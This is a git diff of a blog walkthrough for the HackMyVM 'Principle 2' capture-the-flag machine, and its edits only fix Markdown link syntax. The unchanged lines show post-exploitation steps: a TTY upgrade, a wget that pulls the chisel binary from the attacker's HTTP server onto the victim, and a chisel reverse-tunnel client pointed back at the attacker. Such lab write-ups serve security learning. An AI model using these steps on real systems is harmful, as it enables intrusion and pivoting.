@@ -1,5 +1,5 @@
 ---
-title: HMV [2][Principle 2] walkthrough
+title: HMV Principle 2 walkthrough
 date: 2023-12-18 00:00:01 +0000
 categories: [hackmyvm, walkthrough]
 tags: [hackmyvm, walkthrough, hmv, principle, rpc, nfs, user impersonation, steganography, path traversal, lfi, log poisoning, reverse proxy, chisel, hydra, binary hijack]
@@ -9,11 +9,11 @@ img_path: /assets/img/posts/
 ![Principle 2](hmv-principle2-logo.png)
 *HMV Principle 2*
 
-I was back to acting last beta tester for my friend [1][Kaian].
-I have dedicated the last few days to solve [1][Kaian]'s last machine: [2][Principle 2] for HackMyVM.
+I was back to acting last beta tester for my friend [Kaian][1].
+I have dedicated the last few days to solve [Kaian][1]'s last machine: [Principle 2][2] for HackMyVM.
 I really, admire **A LOT** al the work behind each of one of these boxes.
 Again, it was a very fun machine and it was a great experience help him, but, this time I have to admit that was a little more complicated.
-This time it was a medium level machine, and to solve [2][Principle 2], I had to learn a few new tricks.
+This time it was a medium level machine, and to solve [Principle 2][2], I had to learn a few new tricks.
 
 And, as always, once completed the box, it's time to write my walkthough.
 
@@ -23,7 +23,7 @@ And, as always, once completed the box, it's time to write my walkthough.
 >
 >Local machine (attacker, local host): 10.0.0.1
 >
->Target machine (victim, [2][Principle 2] box): 10.0.0.2
+>Target machine (victim, [Principle 2][2] box): 10.0.0.2
 {: .prompt-info}
 
 # Warnings
@@ -349,7 +349,7 @@ $ stty size
 56 205
 ```
 
-Now, we treat our new tty in [2][Principle 2]:
+Now, we treat our new tty in [Principle 2][2]:
 
 ```
 $ script /dev/null -c bash
@@ -444,14 +444,14 @@ $ uname -a
 Linux principle2 6.1.0-13-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.55-1 (2023-09-29) x86_64 GNU/Linux
 ```
 
-We need the amd64 version of chisel, and copy the binary from our host to [2][Principle 2].
+We need the amd64 version of chisel, and copy the binary from our host to [Principle 2][2].
 To do this, we will mount an http server in our host, in the directory where we have the chisel binaries, with python:
 
 ```
 $ python -m http.server 443
 ```
 
-And, in [2][Principle 2], we download the chisel bynary from our host:
+And, in [Principle 2][2], we download the chisel bynary from our host:
 
 ```
 $ wget http://192.168.1.21:443/chisel_1.9.1_linux_amd64
@@ -465,7 +465,7 @@ Once copied, we will start the chisel server on our host:
 $ ./chisel_1.9.1_linux_amd64 server --reverse 8080
 ```
 
-And now, we will start the chisel client on [2][Principle 2]:
+And now, we will start the chisel client on [Principle 2][2]:
 
 ```
 $ ./chisel client 10.0.0.1:8080 R:22222:127.0.0.1:345
